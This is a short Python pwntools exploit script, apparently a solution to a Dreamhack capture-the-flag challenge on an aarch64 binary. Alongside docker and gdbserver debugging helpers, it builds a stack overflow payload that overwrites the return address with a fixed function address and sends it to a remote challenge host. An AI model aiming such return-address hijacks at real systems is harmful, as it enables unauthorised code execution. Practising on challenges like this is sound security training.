#!/usr/bin/env python3

from pwn import *

exe = ELF("./prob_patched")

context.binary = exe
context.arch = 'aarch64'
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

local_port = 5000

localscript = '''
file %s
define rerun
    !docker exec -u root -i debug_container bash -c "kill -9 \\$(pidof gdbserver) &"
    !docker exec -u root -i debug_container bash -c "gdbserver :9090 --attach \\$(pidof chall) &"
end
define con
    target remote :9090
end
''' % exe.path

gdbscript = '''
b *main
continue
'''

info = lambda msg: log.info(msg)
sla = lambda p, msg, data: p.sendlineafter(msg, data)
sna = lambda p, msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda p, msg, data: p.sendafter(msg, data)
sl = lambda p, data: p.sendline(data)
sn = lambda p, data: p.sendline(str(data).encode())
s = lambda p, data: p.send(data)


def conn():
    if args.LOCAL:
        r = process('./run.sh')
        # r = remote("localhost", local_port)
    elif args.GDB:
        r = process('../utils/debug-run.sh')
        # r = gdb.debug('./run.sh', gdbscript, env=dict(SHELL='/bin/bash'))
        gdb.attach (target=('localhost', 1234), exe=exe.path, gdbscript=gdbscript)
    elif args.REMOTE:
        r = remote("host8.dreamhack.games", 24347)

    return r

def debug_container(p):
    if args.LOCAL:
        gdbserver_cmd = "docker exec -u root -i debug_container bash -c".split()
        gdbserver_cmd.append("gdbserver :9090 --attach $(pidof prob)")
        process(gdbserver_cmd)
        
        # gdb.attach(('0.0.0.0', 9090), exe=exe.path, gdbscript=localscript + gdbscript)
        pause()


def main():
    p = conn()
    if args.LOCAL and args.GDB:
        debug_container(p)

    main = 0x4007d4
    script_execute = 0x441AA0
    payload = b'A' * 0x10 + p64 (0) + p64 (script_execute)

    sla (p, b'input: ', payload)

    p.interactive()


if __name__ == "__main__":
    main()